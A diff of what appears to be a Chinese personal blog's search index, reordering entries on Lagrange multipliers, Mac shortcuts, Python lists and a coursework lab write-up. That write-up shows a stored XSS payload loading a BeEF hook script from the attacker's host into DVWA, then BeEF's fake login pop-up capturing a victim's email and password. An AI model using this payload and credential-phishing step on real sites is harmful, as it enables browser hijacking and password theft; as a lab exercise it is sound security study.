@@ -203,6 +203,20 @@
       </categories>
   </entry>
   <entry>
+    <title>拉格朗日乘数法</title>
+    <url>/2019/12/09/langrange-multi-approach/</url>
+    <content><![CDATA[<p>在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。<a id="more"></a><br>看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了…</p>
+<h3 id="一、简介-from-wiki"><a href="#一、简介-from-wiki" class="headerlink" title="一、简介(from wiki)"></a>一、简介(<em>from wiki</em>)</h3><p>在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有<strong>n</strong>个变量与<strong>k</strong>个约束条件的最优化问题转换为一个解有<strong>n + k</strong>个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。<br>比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\lambda$，这时我们只需要下列拉格朗日函数的极值：$\mathcal{L}(x,y,\lambda)=f(x,y)+\lambda \cdot {\Big (}g(x,y)-c{\Big )}$<br>更一般的，对含有n个变量和k个约束的情况，有：<br>$\mathcal{L}(x_{1},\ldots,x_{n},\lambda_{1},\ldots,\lambda_{k}) = f(x_{1},\ldots ,x_{n})-\sum \limits_{i=1}^{k}\lambda_{i}g_{i}(x_{1},\ldots,x_{n})$，<br><strong>拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。</strong>拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。</p>
+<h3 id="二、证明"><a href="#二、证明" class="headerlink" title="二、证明"></a>二、证明</h3><p>设函数$f(x,y)$在$A$处有极值$\kappa$,且在点$A$的邻域内连续。则在点$A$处有：<br>$f(x,y) = \kappa$<br>另有一常值函数<br>$g(x,y) = c$<br>两函数在$A$点处的全微分为:<br>$\mathrm{d}f=\dfrac{\partial{f}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{f}}{\partial{y}}\mathrm{d}y = 0$<br>$\mathrm{d}g=\dfrac{\partial{g}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{g}}{\partial{y}}\mathrm{d}y = 0$<br>由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：<br>$\dfrac {\dfrac {\partial {f}}{\partial {x}}} {\dfrac {\partial {g}}{\partial {x}}} = \dfrac {\dfrac {\partial {f}}{\partial {y}}} {\dfrac {\partial {g}}{\partial {y}}} = -\lambda$<br>即：<br>$\dfrac{\partial{f}}{\partial{x}} + \lambda \dfrac{\partial{g}}{\partial{x}} = 0$</p>
+<p>$\dfrac{\partial{f}}{\partial{y}} + \lambda \dfrac{\partial{g}}{\partial{y}} = 0$<br>将上二式分别乘以$\mathrm{d}x$和$\mathrm{d}y$，再相加并积分，得到一新函数<br>$\mathcal{L}(x,y,\lambda) = f(x,y) + \lambda \cdot g(x,y)$<br>那么，求原函数极值的问题就转化为求该函数极值的问题。<br>类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\ldots,x_{n})$</p>
+<h3 id="三、举例"><a href="#三、举例" class="headerlink" title="三、举例"></a>三、举例</h3><p>给定椭球：$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。<br>这个问题实际上就是条件极值问题，即在条件$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。<br>首先定义拉格朗日函数$\mathcal{L}(x,y,z,\lambda) = 8xyz + \lambda \cdot (\dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1)$<br>之后解变量的偏导方程，对$\mathcal{L}(x,y,z,\lambda)$求偏导得：<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{x}} = 8yz + \dfrac {2 \lambda x}{a^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{y}} = 8xz + \dfrac {2 \lambda y}{b^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{z}} = 8xy + \dfrac {2 \lambda z}{c^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{\lambda}} = \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1 = 0$<br>联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：<br>$x = \dfrac{\sqrt{3}}{3}a$  $y = \dfrac{\sqrt{3}}{3}b$  $z = \dfrac{\sqrt{3}}{3}c$<br>带入解得内接长方体的最大体积为：$V_{max} = f(\dfrac{\sqrt{3}}{3}a,\dfrac{\sqrt{3}}{3}b,\dfrac{\sqrt{3}}{3}c) = \dfrac{8\sqrt{3}}{9}abc$</p>
+<h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><p>维基百科上的这幅图画的很直观，特转自于此<br><img src="/2019/12/09/langrange-multi-approach/Lagrange_multiplier.png" alt="1.png"><br><strong>另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。</strong></p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>DC4</title>
     <url>/2019/09/17/hacker-3/</url>
     <content><![CDATA[<p>软件综合训练-续<a id="more"></a></p>
@@ -310,17 +324,70 @@
       </categories>
   </entry>
   <entry>
-    <title>拉格朗日乘数法</title>
-    <url>/2019/12/09/langrange-multi-approach/</url>
-    <content><![CDATA[<p>在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。<a id="more"></a><br>看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了…</p>
-<h3 id="一、简介-from-wiki"><a href="#一、简介-from-wiki" class="headerlink" title="一、简介(from wiki)"></a>一、简介(<em>from wiki</em>)</h3><p>在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有<strong>n</strong>个变量与<strong>k</strong>个约束条件的最优化问题转换为一个解有<strong>n + k</strong>个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。<br>比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\lambda$，这时我们只需要下列拉格朗日函数的极值：$\mathcal{L}(x,y,\lambda)=f(x,y)+\lambda \cdot {\Big (}g(x,y)-c{\Big )}$<br>更一般的，对含有n个变量和k个约束的情况，有：<br>$\mathcal{L}(x_{1},\ldots,x_{n},\lambda_{1},\ldots,\lambda_{k}) = f(x_{1},\ldots ,x_{n})-\sum \limits_{i=1}^{k}\lambda_{i}g_{i}(x_{1},\ldots,x_{n})$，<br><strong>拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。</strong>拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。</p>
-<h3 id="二、证明"><a href="#二、证明" class="headerlink" title="二、证明"></a>二、证明</h3><p>设函数$f(x,y)$在$A$处有极值$\kappa$,且在点$A$的邻域内连续。则在点$A$处有：<br>$f(x,y) = \kappa$<br>另有一常值函数<br>$g(x,y) = c$<br>两函数在$A$点处的全微分为:<br>$\mathrm{d}f=\dfrac{\partial{f}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{f}}{\partial{y}}\mathrm{d}y = 0$<br>$\mathrm{d}g=\dfrac{\partial{g}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{g}}{\partial{y}}\mathrm{d}y = 0$<br>由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：<br>$\dfrac {\dfrac {\partial {f}}{\partial {x}}} {\dfrac {\partial {g}}{\partial {x}}} = \dfrac {\dfrac {\partial {f}}{\partial {y}}} {\dfrac {\partial {g}}{\partial {y}}} = -\lambda$<br>即：<br>$\dfrac{\partial{f}}{\partial{x}} + \lambda \dfrac{\partial{g}}{\partial{x}} = 0$</p>
-<p>$\dfrac{\partial{f}}{\partial{y}} + \lambda \dfrac{\partial{g}}{\partial{y}} = 0$<br>将上二式分别乘以$\mathrm{d}x$和$\mathrm{d}y$，再相加并积分，得到一新函数<br>$\mathcal{L}(x,y,\lambda) = f(x,y) + \lambda \cdot g(x,y)$<br>那么，求原函数极值的问题就转化为求该函数极值的问题。<br>类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\ldots,x_{n})$</p>
-<h3 id="三、举例"><a href="#三、举例" class="headerlink" title="三、举例"></a>三、举例</h3><p>给定椭球：$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。<br>这个问题实际上就是条件极值问题，即在条件$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。<br>首先定义拉格朗日函数$\mathcal{L}(x,y,z,\lambda) = 8xyz + \lambda \cdot (\dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1)$<br>之后解变量的偏导方程，对$\mathcal{L}(x,y,z,\lambda)$求偏导得：<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{x}} = 8yz + \dfrac {2 \lambda x}{a^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{y}} = 8xz + \dfrac {2 \lambda y}{b^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{z}} = 8xy + \dfrac {2 \lambda z}{c^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{\lambda}} = \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1 = 0$<br>联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：<br>$x = \dfrac{\sqrt{3}}{3}a$  $y = \dfrac{\sqrt{3}}{3}b$  $z = \dfrac{\sqrt{3}}{3}c$<br>带入解得内接长方体的最大体积为：$V_{max} = f(\dfrac{\sqrt{3}}{3}a,\dfrac{\sqrt{3}}{3}b,\dfrac{\sqrt{3}}{3}c) = \dfrac{8\sqrt{3}}{9}abc$</p>
-<h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><p>维基百科上的这幅图画的很直观，特转自于此<br><img src="/2019/12/09/langrange-multi-approach/Lagrange_multiplier.png" alt="1.png"><br><strong>另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。</strong></p>
+    <title>XSS结合Beef的社会工程学窃取密码实验</title>
+    <url>/2019/09/18/hacker-4/</url>
+    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
+<p>不说废话了，直接切入正题……</p>
+<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
+<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
+<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
+<p>你会看到弹出一个终端如下：</p>
+<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
+<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
+<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
+<p>我们输入用户名密码之后会显示如下页面：</p>
+<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
+<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
+<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
+<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
+<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
+<p>之后点击启动，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
+<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
+<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
+<p>如图所示，我的win7的ip地址为192.168.73.129</p>
+<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
+<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
+<p>用户名为admin，密码为password。登陆之后显示如下：</p>
+<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
+<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
+<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
+<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
+<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
+<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
+<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
+<p>按下F12，查看源码。</p>
+<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
+<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
+<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
+<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
+<p>改完之后可以关掉这个框框了。</p>
+<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
+<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
+<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
+<p>是不是像下面这样显示呢？</p>
+<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
+<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
+<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
+<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
+<p>让我们点击它，出现下面这个页面：</p>
+<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
+<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
+<p>现在我们可以点击右下角的Execute了。</p>
+<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
+<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
+<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
+<p>回到beef页面，你会在数据库中看到如下信息：</p>
+<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
+<p>到这里这个实验就结束了！</p>
 ]]></content>
       <categories>
-        <category>Daily Essays</category>
+        <category>软件综合训练课程</category>
       </categories>
   </entry>
   <entry>
@@ -393,73 +460,6 @@
 ]]></content>
       <categories>
         <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>XSS结合Beef的社会工程学窃取密码实验</title>
-    <url>/2019/09/18/hacker-4/</url>
-    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
-<p>不说废话了，直接切入正题……</p>
-<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
-<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
-<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
-<p>你会看到弹出一个终端如下：</p>
-<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
-<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
-<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
-<p>我们输入用户名密码之后会显示如下页面：</p>
-<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
-<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
-<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
-<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
-<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
-<p>之后点击启动，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
-<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
-<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
-<p>如图所示，我的win7的ip地址为192.168.73.129</p>
-<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
-<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
-<p>用户名为admin，密码为password。登陆之后显示如下：</p>
-<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
-<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
-<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
-<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
-<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
-<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
-<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
-<p>按下F12，查看源码。</p>
-<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
-<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
-<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
-<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
-<p>改完之后可以关掉这个框框了。</p>
-<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
-<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
-<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
-<p>是不是像下面这样显示呢？</p>
-<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
-<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
-<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
-<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
-<p>让我们点击它，出现下面这个页面：</p>
-<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
-<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
-<p>现在我们可以点击右下角的Execute了。</p>
-<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
-<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
-<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
-<p>回到beef页面，你会在数据库中看到如下信息：</p>
-<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
-<p>到这里这个实验就结束了！</p>
-]]></content>
-      <categories>
-        <category>软件综合训练课程</category>
       </categories>
   </entry>
   <entry>
@@ -554,6 +554,23 @@
       </categories>
   </entry>
   <entry>
+    <title>Mac使用小技巧</title>
+    <url>/2020/03/12/mac-tips/</url>
+    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
+<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
+<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
+<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
+<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
+<li>浏览器新建标签页：<code>command + T</code></li>
+<li>快速调用emoji表情：<code>control + command + space</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>LeetCode DAY 7 (11-12)</title>
     <url>/2020/01/19/leetcode-day7/</url>
     <content><![CDATA[<p>我果然还是一条懒狗，拖更了两天，今天补上。<a id="more"></a></p>
@@ -579,23 +596,6 @@
 ]]></content>
       <categories>
         <category>LeetCode系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Mac使用小技巧</title>
-    <url>/2020/03/12/mac-tips/</url>
-    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
-<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
-<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
-<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
-<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
-<li>浏览器新建标签页：<code>command + T</code></li>
-<li>快速调用emoji表情：<code>control + command + space</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
       </categories>
   </entry>
   <entry>
@@ -634,19 +634,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Python中如何定义二维数组</title>
-    <url>/2019/11/17/py-cre-douarr/</url>
-    <content><![CDATA[<p>小知识点随手记录…<a id="more"></a></p>
-<h3 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h3><p>或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> numpy</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = numpy.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>],</span><br><span class="line">       [<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>]])</span><br></pre></td></tr></table></figure><br>但如果不用numpy呢？</p>
-<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>有人会说可以定义一个二维列表代替二维数组呗。</p>
-<h4 id="1-错误方式"><a href="#1-错误方式" class="headerlink" title="1. 错误方式"></a>1. 错误方式</h4><p>一开始一定会有人这样定义<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>特么的怎么连<code>a[1][0]</code>也跟着变成1了，因为上面的定义方式等价于：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list = [<span class="hljs-number">0</span>] * 